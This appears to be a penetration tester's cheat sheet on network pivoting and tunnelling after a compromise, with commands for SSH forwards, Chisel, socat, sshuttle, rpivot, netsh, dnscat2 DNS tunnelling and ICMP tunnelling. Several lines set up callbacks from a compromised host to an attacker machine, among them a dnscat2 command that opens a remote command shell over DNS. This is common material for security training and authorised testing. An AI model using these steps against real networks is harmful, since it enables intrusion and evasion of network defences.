* SSH local port forward: `ssh -N -L <ssh_client local port>:localhost:<ssh_server local port> <user>@<ssh_server>`
	* Flexible version: `ssh -N -L <ip address listening on ssh_client>:<ssh_client local port>:<ip address listening on ssh_server>:<ssh_server local port> <user>@<ssh_server>`
	* Multiple port forwards: `ssh -N -L <ssh_client local port>:localhost:<ssh_server local port> -L <ssh_client local port>:localhost:<ssh_server local port> -L <ssh_client local port>:localhost:<ssh_server local port> ... <user>@<ssh_server>`
* SSH Dynamic port forward: `ssh -N -D <proxy port on ssh_client> <user>@<ssh_server>`
* SSH Remote/Reverse port forwarding: `ssh -R <InternalIPofPivotHost>:<listening port on pivot host>:0.0.0.0:<listening port on ssh_client> ubuntu@<IPofPivotHost> -vN`
* When in doubt check [[SSH Tunneling Quick Reference.png]]
* proxychains: 
	* Config file: `/etc/proxychains4.conf`
	* Add `socks<4|5> 127.0.0.1 <proxy port>`
	* Redirect network traffic from command to proxy: `proxychains <command>`
* Chisel: Chisel tunnels ssh traffic over HTTP
	* On pivot: `./chisel server -v -p <listening server port> --socks5`
	* On attack: `./chisel client -v <pivot ip>:<pivot listening server port> socks`
	* Reverse tunneling:
		* On attack: `sudo ./chisel server --reverse -v -p <attack listening server port> --socks5`
		* On pivot: `./chisel client -v <attack ip>:<attack listening server port> R:socks`
	* Note: If you are getting an error message with chisel on the target, try with a different version.
	* Cheatsheet: https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
* [[Using MetaSploit]]
* Alternatives:
	* socat: socat is common tool on linux
		* On pivot host: `socat TCP4-LISTEN:<listening port on pivot host>,fork TCP4:<target ip>:<target port>`
	* Plink: Plink is the old ssh equivalent on windows.
		* Dynamic port forwarding: `plink.exe -ssh -D <proxy port on ssh_client> <user>@<ssh_server ip>`
		* [Proxifier](https://www.proxifier.com/) to forward packets to the proxy port.
	* Sshuttle:
		* `sudo sshuttle -r <user>@<ssh_server ip> <subnet in cidr> -v`
		* Since sshuttle adds entries to iptables, there is no need to use proxychains to forward traffic.
	* rpivot:
		* On attack host: `python2.7 server.py --proxy-port <proxy-port> --server-port <server port on attack> --server-ip 0.0.0.0`
		* On pivot target: `python2.7 client.py --server-ip <server-ip> --server-port <server-port>`
	* Netsh.exe: 
		* On pivot host: `netsh.exe interface portproxy add v4tov4 listenport=<listening port on pivot host> listenaddress=<listening ip on pivot host> connectport=<port on target host> connectaddress=<ip on target host>`
		* Verify port forward: `netsh.exe interface portproxy show v4tov4`
* DNS tunneling using dnscat2:
	* On attack host: `sudo ruby dnscat2.rb --dns host=<listening ip on attack>,port=53,domain=<target domain> --no-cache`
	* on windows target: 
		* Get script from [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) and upload to target.
		* Import script and execute: `Start-Dnscat2 -DNSserver <attack ip> -Domain <domain> -PreSharedSecret <shared secret> -Exec cmd`
* ICMP tunneling:
	* On attack host:
		* `git clone https://github.com/utoni/ptunnel-ng.git`
		* `sudo ./autogen.sh`
		* Transfer the repo to target.
	* On target:
		* `sudo ./ptunnel-ng -r<listening ip on target> -R<listening port on target>`
	* On attack:
		* `sudo ./ptunnel-ng -p<ip on target> -l2222 -r<ptunnel server ip on target> -R<ptunnel server port on target>`
* SocksOverRDP: https://www.errno.fr/RDPTunneling.html